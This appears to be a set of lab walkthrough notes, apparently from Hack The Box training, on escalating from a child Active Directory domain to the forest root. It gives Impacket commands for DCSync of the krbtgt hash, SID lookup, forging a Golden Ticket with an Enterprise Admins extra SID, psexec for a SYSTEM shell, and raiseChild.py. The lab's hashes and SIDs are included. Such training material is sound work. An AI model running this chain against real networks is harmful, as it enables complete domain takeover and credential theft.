#### Performing DCSync with secretsdump.py

```shell
3kjS@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
![](Screenshot%202026-06-01%20at%2014.04.35.png)
#### Performing SID Brute Forcing using lookupsid.py

```shell
3kjS@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
![](Screenshot%202026-06-01%20at%2014.05.01.png)
#### Looking for the Domain SID

```shell
3kjS@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password: 

[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```
#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```shell
3kjS@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
![](Screenshot%202026-06-01%20at%2014.05.56.png)

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
#### Constructing a Golden Ticket using ticketer.py

```shell
3kjS@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
![](Screenshot%202026-06-01%20at%2014.07.03.png)
#### Setting the KRB5CCNAME Environment Variable

```shell
3kjS@htb[/htb]$ export KRB5CCNAME=hacker.ccache
```
#### Getting a SYSTEM shell using Impacket's psexec.py

```shell
3kjS@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
![](Screenshot%202026-06-01%20at%2014.07.36.png)
#### Performing the Attack with raiseChild.py

```shell
3kjS@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
